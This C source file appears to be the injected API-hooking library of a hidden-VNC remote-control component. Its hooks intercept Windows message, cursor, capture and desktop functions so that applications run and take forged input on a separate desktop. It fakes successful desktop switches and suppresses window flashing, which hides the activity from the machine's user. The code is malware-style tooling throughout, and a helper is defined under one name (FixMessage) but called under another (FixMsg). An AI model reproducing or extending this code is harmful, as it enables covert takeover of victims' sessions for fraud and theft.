#include "injlib.h"
#include <commctrl.h>
#include "vncmsg.h"
#include "..\vnc\events.h"
#include "..\vnc\dib.h"
#include "..\vnc\vnc.h"
#include "..\vnc\windows.h"
#include "..\vnc\mou.h"

#define GET_X_LPARAM(lp) ((int)(short)LOWORD(lp))
#define GET_Y_LPARAM(lp) ((int)(short)HIWORD(lp))

SUBCLASS_INFO *lpSubclassInfo;
bool bIsShell;

void AppendSubclassedWnd(HWND hWnd,LONG_PTR dwOrig)
{
    SUBCLASS_INFO *siItem=lpSubclassInfo;
    if (!siItem)
        siItem=lpSubclassInfo=(SUBCLASS_INFO *)MemAlloc(sizeof(SUBCLASS_INFO));
    else
    {
        while (siItem->lpNext)
            siItem=siItem->lpNext;
        siItem=siItem->lpNext=(SUBCLASS_INFO *)MemAlloc(sizeof(SUBCLASS_INFO));
    }
    siItem->dwOriginal=dwOrig;
    siItem->hWnd=hWnd;
    return;
}

LONG_PTR GetSubclassedProc(HWND hWnd)
{
    SUBCLASS_INFO *siItem=lpSubclassInfo;
    LONG_PTR lRes=0;
    do
    {
        if (siItem->hWnd == hWnd)
        {
            lRes=siItem->dwOriginal;
            break;
        }
        siItem=siItem->lpNext;
    }
    while (siItem);
    return lRes;
}

#pragma optimize("",off)
DEF_HOOK(DefWindowProcW);
LRESULT WINAPI DefWindowProcW_handler(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
    REAL_API(DefWindowProcW)
        return NULL;
    DEFPROC_PROLOG(hWnd);
    return lpDefWindowProcW(hWnd,uMsg,wParam,lParam);
}

DEF_HOOK(DefWindowProcA);
LRESULT WINAPI DefWindowProcA_handler(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
    REAL_API(DefWindowProcA)
        return NULL;
    DEFPROC_PROLOG(hWnd);
    return lpDefWindowProcA(hWnd,uMsg,wParam,lParam);
}

DEF_HOOK(DefDlgProcW);
LRESULT WINAPI DefDlgProcW_handler(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
    REAL_API(DefDlgProcW)
        return NULL;
    DEFPROC_PROLOG(hWnd);
    return lpDefDlgProcW(hWnd,uMsg,wParam,lParam);
}

DEF_HOOK(DefDlgProcA);
LRESULT WINAPI DefDlgProcA_handler(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
    REAL_API(DefDlgProcA)
        return NULL;
    DEFPROC_PROLOG(hWnd);
    return lpDefDlgProcA(hWnd,uMsg,wParam,lParam);
}

DEF_HOOK(DefFrameProcW);
LRESULT WINAPI DefFrameProcW_handler(HWND hFrame,HWND hClient,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
    REAL_API(DefFrameProcW)
        return NULL;
    DEFPROC_PROLOG(hFrame);
    return lpDefFrameProcW(hFrame,hClient,uMsg,wParam,lParam);
}

DEF_HOOK(DefFrameProcA);
LRESULT WINAPI DefFrameProcA_handler(HWND hFrame,HWND hClient,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
    REAL_API(DefFrameProcA)
        return NULL;
    DEFPROC_PROLOG(hFrame);
    return lpDefFrameProcA(hFrame,hClient,uMsg,wParam,lParam);
}

DEF_HOOK(DefMDIChildProcW);
LRESULT WINAPI DefMDIChildProcW_handler(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
    REAL_API(DefMDIChildProcW)
        return NULL;
    DEFPROC_PROLOG(hWnd);
    return lpDefMDIChildProcW(hWnd,uMsg,wParam,lParam);
}

DEF_HOOK(DefMDIChildProcA);
LRESULT WINAPI DefMDIChildProcA_handler(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
    REAL_API(DefMDIChildProcA)
        return NULL;
    DEFPROC_PROLOG(hWnd);
    return lpDefMDIChildProcA(hWnd,uMsg,wParam,lParam);
}

DEF_HOOK(CallWindowProcW);
LRESULT WINAPI CallWindowProcW_handler(WNDPROC lpPrevWndFunc,HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
    REAL_API(CallWindowProcW)
        return NULL;
    DEFPROC_PROLOG(hWnd);
    return lpCallWindowProcW(lpPrevWndFunc,hWnd,uMsg,wParam,lParam);
}

DEF_HOOK(CallWindowProcA);
LRESULT WINAPI CallWindowProcA_handler(WNDPROC lpPrevWndFunc,HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
    REAL_API(CallWindowProcA)
        return NULL;
    DEFPROC_PROLOG(hWnd);
    return lpCallWindowProcA(lpPrevWndFunc,hWnd,uMsg,wParam,lParam);
}
#pragma optimize("",on)

void FixMessage(BOOL r,LPMSG Msg)
{
    if ((lpServer) && (lpServer->bIsVNC) && (lpServer->lpGlobalVNCData))
    {
         if (r > 0)
        {
            Msg->pt.x=lpServer->lpGlobalVNCData->ptCursor.x;
            Msg->pt.y=lpServer->lpGlobalVNCData->ptCursor.y;
        }
       if (Msg->message == lpServer->lpGlobalVNCData->dwVNCMessage)
            HandleVNCMsg(Msg->hwnd,Msg->wParam,Msg->lParam);
    }

    return;
}

#pragma optimize("",off)
DEF_HOOK(GetMessageW);
BOOL WINAPI GetMessageW_handler(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax)
{
    REAL_API(GetMessageW)
        return FALSE;
    BOOL r=lpGetMessageW(Msg,hWnd,uMsgFilterMin,uMsgFilterMax);
    FixMsg(r,Msg);
    return r;
}

DEF_HOOK(GetMessageA);
BOOL WINAPI GetMessageA_handler(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax)
{
    REAL_API(GetMessageA)
        return FALSE;
    BOOL r=lpGetMessageA(Msg,hWnd,uMsgFilterMin,uMsgFilterMax);
    FixMsg(r,Msg);
    return r;
}

DEF_HOOK(PeekMessageW);
BOOL WINAPI PeekMessageW_handler(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax,UINT uRemoveMsg)
{
    REAL_API(PeekMessageW)
        return FALSE;
    BOOL r=lpPeekMessageW(Msg,hWnd,uMsgFilterMin,uMsgFilterMax,uRemoveMsg);
    FixMsg(r,Msg);
    return r;
}

DEF_HOOK(PeekMessageA);
BOOL WINAPI PeekMessageA_handler(LPMSG Msg,HWND hWnd,UINT uMsgFilterMin,UINT uMsgFilterMax,UINT uRemoveMsg)
{
    REAL_API(PeekMessageA)
        return FALSE;
    BOOL r=lpPeekMessageA(Msg,hWnd,uMsgFilterMin,uMsgFilterMax,uRemoveMsg);
    FixMsg(r,Msg);
    return r;
}
#pragma optimize("",on)

DEF_HOOK(SetCursorPos);
BOOL WINAPI SetCursorPos_handler(int X,int Y)
{
    if ((lpServer) && (lpServer->bIsVNC) && (lpServer->lpGlobalVNCData))
    {
        g_enter(hInputMutex)
        {
            lpServer->lpGlobalVNCData->ptCursor.x=X;
            lpServer->lpGlobalVNCData->ptCursor.y=Y;
        }
        g_leave(hInputMutex)
        return true;
    }
    REAL_API(SetCursorPos)
        return FALSE;
    return lpSetCursorPos(X,Y);
}

DEF_HOOK(GetCursorPos);
BOOL WINAPI GetCursorPos_handler(LPPOINT lpPoint)
{
    if ((lpServer) && (lpServer->bIsVNC) && (lpServer->lpGlobalVNCData))
    {
        if (lpPoint)
        {
            *lpPoint=lpServer->lpGlobalVNCData->ptCursor;
            return true;
        }
        return false;
    }
    REAL_API(GetCursorPos)
        return FALSE;
    return lpGetCursorPos(lpPoint);
}

DEF_HOOK(GetMessagePos);
DWORD WINAPI GetMessagePos_handler(VOID)
{
    if ((lpServer) && (lpServer->bIsVNC) && (lpServer->lpGlobalVNCData))
    {
        DWORD dwResult=(DWORD)((SHORT)lpServer->lpGlobalVNCData->ptCursor.x | ((SHORT)(lpServer->lpGlobalVNCData->ptCursor.y) << 16));
        return dwResult;
    }
    REAL_API(GetMessagePos)
        return NULL;
    return lpGetMessagePos();
}

DEF_HOOK(OpenInputDesktop);
HDESK WINAPI OpenInputDesktop_handler(DWORD dwFlags,BOOL bInherit,ACCESS_MASK dwDesiredAccess)
{
    if ((lpServer) && (lpServer->bIsVNC))
    {
        REAL_API(OpenDesktopA)
            return NULL;
        return lpOpenDesktopA(lpServer->DeskInfo.szDeskName,dwFlags,bInherit,dwDesiredAccess);
    }

    REAL_API(OpenInputDesktop)
        return NULL;
    return lpOpenInputDesktop(dwFlags,bInherit,dwDesiredAccess);
}

DEF_HOOK(SwitchDesktop);
BOOL WINAPI SwitchDesktop_handler(HDESK hDesk)
{
    if ((lpServer) && (lpServer->bIsVNC))
        return true;

    REAL_API(SwitchDesktop)
        return FALSE;
    return lpSwitchDesktop(hDesk);
}

DEF_HOOK(OpenDesktopA);
HDESK WINAPI OpenDesktopA_handler(LPCSTR lpszDesktop,DWORD dwFlags,BOOL bInherit,ACCESS_MASK dwDesiredAccess)
{
    REAL_API(OpenDesktopA)
        return NULL;
	if ((lpServer) && (lpServer->bIsVNC))
	{
		if (lstrcmpiA(lpszDesktop,"default"))
			return lpOpenDesktopA(lpServer->DeskInfo.szDeskName,dwFlags,bInherit,dwDesiredAccess);
	}

	return lpOpenDesktopA(lpszDesktop,dwFlags,bInherit,dwDesiredAccess);
}

DEF_HOOK(OpenDesktopW);
HDESK WINAPI OpenDesktopW_handler(LPCWSTR lpszDesktop,DWORD dwFlags,BOOL bInherit,ACCESS_MASK dwDesiredAccess)
{
    REAL_API(OpenDesktopW)
        return NULL;
	if ((lpServer) && (lpServer->bIsVNC))
	{
		if (lstrcmpiW(lpszDesktop,L"default"))
        {
            REAL_API(OpenDesktopA)
                return NULL;
			return lpOpenDesktopA(lpServer->DeskInfo.szDeskName,dwFlags,bInherit,dwDesiredAccess);
        }
	}

	return lpOpenDesktopW(lpszDesktop,dwFlags,bInherit,dwDesiredAccess);
}

DEF_HOOK(FlashWindowEx);
BOOL WINAPI FlashWindowEx_handler(PFLASHWINFO pfwi)
{
    if ((lpServer) && (lpServer->bIsVNC))
        return true;

    REAL_API(FlashWindowEx)
        return FALSE;
    return lpFlashWindowEx(pfwi);
}

DEF_HOOK(FlashWindow);
BOOL WINAPI FlashWindow_handler(HWND hWnd,BOOL bInvert)
{
    if ((lpServer) && (lpServer->bIsVNC))
        return true;

    REAL_API(FlashWindow)
        return FALSE;
    return lpFlashWindow(hWnd,bInvert);
}

DEF_HOOK(SetCapture);
HWND WINAPI SetCapture_handler(HWND hWnd)
{
    if ((lpServer) && (lpServer->bIsVNC))
    {
        if (!hWnd)
            return ChangeMouseCapture(lpServer,0,NULL,HTNOWHERE,false);
        else
        {
            DWORD dwThreadID=GetCurrentThreadId();
            if (dwThreadID == GetWindowThreadProcessId(hWnd,NULL))
                return ChangeMouseCapture(lpServer,dwThreadID,hWnd,HTNOWHERE,false);
            return NULL;
        }
    }
    REAL_API(SetCapture)
        return NULL;
    return lpSetCapture(hWnd);
}

DEF_HOOK(ReleaseCapture);
BOOL WINAPI ReleaseCapture_handler(VOID)
{
    if ((lpServer) && (lpServer->bIsVNC) && (lpServer->lpGlobalVNCData))
    {
        if (lpServer->lpGlobalVNCData->dwCapturedThreadID == GetCurrentThreadId())
        {
            ChangeMouseCapture(lpServer,0,NULL,HTNOWHERE,false);
            return TRUE;
        }
        SetLastError(ERROR_ACCESS_DENIED);
        return FALSE;
    }
    REAL_API(ReleaseCapture)
        return FALSE;
    return lpReleaseCapture();
}

DEF_HOOK(GetCapture);
HWND WINAPI GetCapture_handler(void)
{
    if ((lpServer) && (lpServer->bIsVNC) && (lpServer->lpGlobalVNCData))
    {
        if (lpServer->lpGlobalVNCData->dwCapturedThreadID == GetCurrentThreadId())
        {
            HWND hWnd=lpServer->lpGlobalVNCData->hCapturedWnd;
            if ((hWnd) && (!IsWindow(hWnd)))
                ChangeMouseCapture(lpServer,0,NULL,HTNOWHERE,false);
            else
                return hWnd;
        }
        return NULL;
    }
    REAL_API(GetCapture)
        return NULL;
    return lpGetCapture();
}

DEF_HOOK(SetDIBitsToDevice);
int WINAPI SetDIBitsToDevice_handler(HDC hdc,int xDest,int yDest,DWORD w,DWORD h,int xSrc,int ySrc,UINT StartScan,UINT cLines,CONST VOID *lpvBits,CONST BITMAPINFO *lpbmi,UINT ColorUse)
{
    REAL_API(SetDIBitsToDevice)
        return NULL;
    HWND hWnd=WindowFromDC(hdc);
    while (hWnd)
    {
        JavaPaintHook *pjhd=&JavaHooks;
        while ((pjhd->hWnd != hWnd) && (pjhd->next))
            pjhd=pjhd->next;

        if (pjhd->hWnd != hWnd)
            break;

        WaitForSingleObject(pjhd->hMutex,INFINITE);
            POINT ptOrigin;
            HRGN Clip=CreateRectRgn(1,1,1,1);
            if (GetClipRgn(hdc,Clip) == 1)
                SelectClipRgn(pjhd->hDC,Clip);
            DeleteObject(Clip);
            GetViewportOrgEx(hdc,&ptOrigin);
            SetViewportOrgEx(pjhd->hDC,ptOrigin.x,ptOrigin.y,NULL);
            int result=lpSetDIBitsToDevice(pjhd->hDC,xDest,yDest,w,h,xSrc,ySrc,StartScan,cLines,lpvBits,lpbmi,ColorUse);
        ReleaseMutex(pjhd->hMutex);
        return result;
    }
    return lpSetDIBitsToDevice(hdc,xDest,yDest,w,h,xSrc,ySrc,StartScan,cLines,lpvBits,lpbmi,ColorUse);
}

DEF_HOOK(TrackPopupMenuEx);
BOOL WINAPI TrackPopupMenuEx_handler(HMENU hmenu,UINT fuFlags,int x,int y,HWND hwnd,LPTPMPARAMS lptpm)
{
    REAL_API(TrackPopupMenuEx)
        return FALSE;
    if ((lpServer) && (lpServer->bIsVNC) && (lpServer->lpGlobalVNCData) && (lpServer->lpGlobalVNCData->bTrayIconUnderCursor) && ((hwnd == lpServer->WndsInfo.hTrayWnd) || (hwnd == lpServer->WndsInfo.hOverflowIconWindow)))
        return TRUE;
    return lpTrackPopupMenuEx(hmenu,fuFlags,x,y,hwnd,lptpm);
}

DEF_HOOK(ShowWindow);
BOOL WINAPI ShowWindow_handler(HWND hWnd,int nCmdShow)
{
    REAL_API(ShowWindow)
        return FALSE;
    return lpShowWindow(hWnd,nCmdShow);
}

LRESULT APIENTRY SubclassProcForIdioticCodes(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    if ((lpServer) && (lpServer->lpGlobalVNCData) && (uMsg == lpServer->lpGlobalVNCData->dwVNCMessage))
        return HandleVNCMsg(hWnd,wParam,lParam);
    REAL_API(CallWindowProcW)
        return NULL;
    return lpCallWindowProcW((WNDPROC)GetSubclassedProc(hWnd),hWnd,uMsg,wParam,lParam);
}

HBRUSH hBkgBrush;
bool bShell;
LRESULT EraseBkg(HWND hWnd,WPARAM wParam)
{
    RECT rect;
    GetClientRect(hWnd,&rect);
    FillRect((HDC)wParam,&rect,hBkgBrush);
    return 1;
}

DEF_HOOK(GetCaretBlinkTime);
UINT WINAPI GetCaretBlinkTime_handler()
{
    return INFINITE;
}

extern CRITICAL_SECTION csTransMsgWnds;
WNDS_LIST_ITEM *lpWnds=NULL;
void AppendWnd(HWND hWnd)
{
    EnterCriticalSection(&csTransMsgWnds);
    {
        WNDS_LIST_ITEM *lpWnd=lpWnds;
        if (lpWnd)
        {
            while (lpWnd->lpNext)
                lpWnd=lpWnd->lpNext;
            lpWnd=lpWnd->lpNext=(WNDS_LIST_ITEM*)MemAlloc(sizeof(WNDS_LIST_ITEM));
        }
        else
            lpWnds=lpWnd=(WNDS_LIST_ITEM*)MemAlloc(sizeof(WNDS_LIST_ITEM));
        lpWnd->hWnd=hWnd;
    }
    LeaveCriticalSection(&csTransMsgWnds);
    return;
}

bool IsTranslateMessageUsed(HWND hWnd)
{
    bool bRet=false;
    EnterCriticalSection(&csTransMsgWnds);
    {
        WNDS_LIST_ITEM *lpWnd=lpWnds;
        while (lpWnd)
        {
            if (lpWnd->hWnd == hWnd)
            {
                bRet=true;
                break;
            }
            lpWnd=lpWnd->lpNext;
        }
    }
    LeaveCriticalSection(&csTransMsgWnds);
    return bRet;
}

DEF_HOOK(TranslateMessage);
BOOL WINAPI TranslateMessage_handler(LPMSG Msg)
{
    if (!IsTranslateMessageUsed(Msg->hwnd))
        AppendWnd(Msg->hwnd);
    REAL_API(TranslateMessage)
        return FALSE;
    return lpTranslateMessage(Msg);
}

extern SHARED_VNC_DATA *lpSharedVNCData;
LRESULT HandleVNCMsg(HWND hWnd,WPARAM wParam,LPARAM lParam)
{
    LRESULT lRes=0;
    switch (wParam)
    {
        case VMW_EXECUTE_MENU:
        case VMW_HILITE_MENU:
        {
            HMENU hMenu=GetMenu(hWnd);
            if (hMenu)
            {
                int dwLastHiliteItem=-1,dwItemsCount=GetMenuItemCount(hMenu);
                for (int i=0; i<dwItemsCount; i++)
                {
                    if (GetMenuState(hMenu,i,MF_BYPOSITION) & MF_HILITE)
                    {
                        HiliteMenuItem(hWnd,hMenu,i,MF_BYPOSITION+MF_UNHILITE);
                        dwLastHiliteItem=i;
                    }
                }

                int dwItem=MenuItemFromPoint(hWnd,hMenu,lpServer->lpGlobalVNCData->ptCursor);
                if (dwItem != -1)
                {
                    DWORD dwItemState=GetMenuState(hMenu,dwItem,MF_BYPOSITION);
                    if (dwLastHiliteItem != dwItem)
                        EndMenu();
                    HiliteMenuItem(hWnd,hMenu,dwItem,MF_BYPOSITION+MF_HILITE);

                    if ((wParam == VMW_HILITE_MENU) || (dwItemState & (MF_DISABLED+MF_GRAYED)))
                        break;

                    if (dwItemState & MF_POPUP)
                    {
                        HMENU hPopupMenu=GetSubMenu(hMenu,dwItem);
                        RECT rcItem;
                        if ((hPopupMenu) && (GetMenuItemRect(hWnd,hMenu,dwItem,&rcItem)))
                            TrackPopupMenuEx(hPopupMenu,TPM_LEFTALIGN+TPM_TOPALIGN+TPM_LEFTBUTTON+TPM_NOANIMATION+TPM_HORIZONTAL,rcItem.left,rcItem.bottom,hWnd,NULL);
                    }
                    else
                    {
                        UINT dwID=(dwItemState & MF_SEPARATOR) ? 0:GetMenuItemID(hMenu,dwItem);
                        if (dwID != (UINT)-1)
                            SendMessage(hWnd,WM_COMMAND,MAKEWPARAM(dwID,0),0);
                    }
                }
            }
            break;
        }
        case VMW_UPDATE_KEYSTATE:
        {
            g_enter(hInputMutex)
            {
                SetKeyboardState(lpServer->lpGlobalVNCData->KbdState);
                bool bCtrl=((lpServer->lpGlobalVNCData->KbdState[VK_CONTROL] & 0x80) != 0),
                     bAlt=((lpServer->lpGlobalVNCData->KbdState[VK_MENU] & 0x80) != 0);

                if (bAlt)
                {
                    if (!bCtrl)
                    {
                        if (lpServer->lpGlobalVNCData->KbdState[VK_F4] & 0x80)
                            PostMessage(GetAncestor(hWnd,GA_ROOT),WM_CLOSE,0,0);
                    }
                    else if (lpServer->lpGlobalVNCData->KbdState[VK_DELETE] & 0x80)
                        ShellExecute(0,_T("open"),_T("taskmgr"),NULL,NULL,SW_SHOWNORMAL);
                }
                else if (bCtrl)
                {
                    if (!bAlt)
                    {
                        if (lpServer->lpGlobalVNCData->KbdState[VK_ESCAPE] & 0x80)
                            PostMessage(lpServer->WndsInfo.hTrayWnd,WM_LBUTTONDOWN,0,0);
                    }
                }
            }
            g_leave(hInputMutex)
            break;
        }
        case VMW_PRINT_SCREEN:
        {
            if (lpServer->DIBInfo.hIntermedMemBitmap)
            {
                HandleWM_PRINT(hWnd);
                lRes=0xDEAD;
            }
            break;
        }
        case VMW_CHANGELAYOUT:
        {
            ActivateKeyboardLayout((HKL)lParam,0);
            break;
        }
        case VMW_IQTEST:
        {
            lRes=VMR_IQOK;
            break;
        }
        case VMW_ERASEBKG:
        {
            RedrawWindow(lpServer->WndsInfo.hDeskListView,NULL,NULL,RDW_INVALIDATE+RDW_ERASE+RDW_UPDATENOW+RDW_ERASENOW);
            break;
        }
        case VMW_TBHITTEST:
        {
            POINT pt={GET_X_LPARAM(lParam),GET_Y_LPARAM(lParam)};
            lRes=SendMessage(hWnd,TB_HITTEST,NULL,(LPARAM)&pt);
            break;
        }
        case VMW_TBRCLICK:
        case VMW_TBLCLICK:
        {
            POINT pt={GET_X_LPARAM(lParam),GET_Y_LPARAM(lParam)};
            int dwBtn=SendMessage(hWnd,TB_HITTEST,NULL,(LPARAM)&pt);
            if (dwBtn)
            {
                TBBUTTON btn;
                SendMessage(hWnd,TB_GETBUTTON,dwBtn,(LPARAM)&btn);
                TCHAR szText[512];
                SendMessage(hWnd,TB_GETBUTTONTEXT,btn.idCommand,(LPARAM)szText);
                HWND hNewWnd=FindWindow(NULL,szText);
                if (!(btn.fsState & TBSTATE_PRESSED))
                    SetForegroundWnd(lpServer,hNewWnd);
                if (wParam == VMW_TBRCLICK)
                {
                    ClientToScreen(hWnd,&pt);
                    PostMessage(hNewWnd,lpServer->lpGlobalVNCData->dwVNCMessage,VMW_SHOWSYSMENU,MAKELPARAM(pt.x,pt.y));
                }
            }
            break;
        }
        case VMW_SHOWSYSMENU:
        {
            HMENU hMenu=GetSystemMenu(hWnd,false);
            SendMessage(hWnd,WM_SYSCOMMAND,TrackPopupMenu(hMenu,TPM_RETURNCMD,GET_X_LPARAM(lParam),GET_Y_LPARAM(lParam),false,hWnd,NULL),NULL);
            break;
        }
        case VMW_ISTRANSMSGUSED:
        {
            if (IsTranslateMessageUsed(hWnd))
                lRes=(LRESULT)hWnd;
            break;
        }
    }
    return lRes;
}

